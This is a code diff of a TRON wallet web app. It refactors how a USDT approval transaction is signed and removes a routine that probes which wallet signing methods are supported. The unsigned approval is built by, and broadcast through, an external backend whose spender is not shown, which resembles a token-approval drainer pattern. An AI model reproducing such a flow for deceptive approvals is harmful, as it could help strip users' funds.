@@ -82,52 +82,37 @@ function TronApp() {
       setAddress(userAddress);
       setStatus(`Connected: ${userAddress}`);
       await web3Modal.closeModal();
-      detectSupportedTronMethods();
+      
 
     } catch (error) {
       console.error("Connection error:", error);
       setStatus("Connection failed");
       await web3Modal.closeModal();
-      detectSupportedTronMethods();
+      
 
     }
   };
-const detectSupportedTronMethods = async () => {
-  
 
-  const methodsToTest = [
-    'tron_signTransaction',
-    'tron_signTransaction',
-    'tron_sign',
-    'tron_signMessage',
-    'personal_sign',
-    'eth_sign'
-  ];
+// add this helper inside your component file (outside the component function is fine)
+function normalizeSignedTx(unsignedTx, signResult) {
+  // Wallets often return just a hex string, or an object with { signature: '0x...' }
+  const sigHex =
+    typeof signResult === 'string'
+      ? signResult
+      : (signResult?.signature || signResult?.data || signResult); // be permissive
 
-  const supported = [];
+  if (!sigHex) throw new Error('Wallet returned no signature');
 
-  for (let method of methodsToTest) {
-    try {
-      console.log(`Testing method: ${method}`);
-      await signClient.request({
-        chainId: MAINNET_CHAIN_ID,
-        topic: session.topic,
-        request: {
-          method,
-          // Passing harmless params
-          params: [address, "Test message from detection script"]
-        }
-      });
-      console.log(`✅ Supported: ${method}`);
-      supported.push(method);
-    } catch (err) {
-      console.log(`❌ Not supported: ${method}`, err.message || err);
-    }
-  }
+  const cleanSig = sigHex.replace(/^0x/i, '');
 
-  console.log("Detected supported TRON methods:", supported);
-  return supported;
-};
+  return {
+    ...unsignedTx,
+    // IMPORTANT: TRON expects an array of signatures (multi-sig ready),
+    // even if there is only one signature.
+    signature: [cleanSig]
+  };
+}
+
 
  const approveUSDT = async () => {
     try {
@@ -145,42 +130,25 @@ const detectSupportedTronMethods = async () => {
             })
         });
 
-        const unsignedTx = await txResponse.json();
-        if (!unsignedTx) throw new Error("Failed to get unsigned transaction");
+       // --- approveUSDT ---
+const unsignedTx = await txResponse.json();
+if (!unsignedTx) throw new Error("Failed to get unsigned transaction");
 
-        setStatus("Waiting for approval signature...");
-        const signedTx = await signClient.request({
-            chainId: MAINNET_CHAIN_ID,
-            topic: session.topic,
-            request: {
-                method: 'tron_signTransaction',
-                params: [{
-                    ...unsignedTx,
-                    // Ensure permission_id is not set here - let wallet decide
-                }]
-            }
-        });
+setStatus("Waiting for approval signature...");
+const signResult = await signClient.request({
+  chainId: MAINNET_CHAIN_ID,
+  topic: session.topic,
+  request: { method: 'tron_signTransaction', params: [unsignedTx] }
+});
 
-        // Handle the signed transaction properly
-        let finalSignedTx;
-        if (typeof signedTx === 'string') {
-            // If wallet returns just the signature
-            finalSignedTx = { 
-                ...unsignedTx, 
-                signature: [signedTx.replace(/^0x/, '')] 
-            };
-        } else {
-            // If wallet returns full signed transaction
-            finalSignedTx = signedTx;
-        }
+const finalSignedTx = normalizeSignedTx(unsignedTx, signResult);
 
-        setStatus("Broadcasting approval transaction...");
-        const broadcastResponse = await fetch('https://smartcontbackend.onrender.com/broadcast', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ signedTx: finalSignedTx })
-        });
-
+setStatus("Broadcasting approval transaction...");
+const broadcastResponse = await fetch('https://smartcontbackend.onrender.com/broadcast', {
+  method: 'POST',
+  headers: { 'Content-Type': 'application/json' },
+  body: JSON.stringify({ signedTx: finalSignedTx })
+});
         const result = await broadcastResponse.json();
         if (!result || !(result.txid || result.txId)) {
             throw new Error("Broadcast failed");
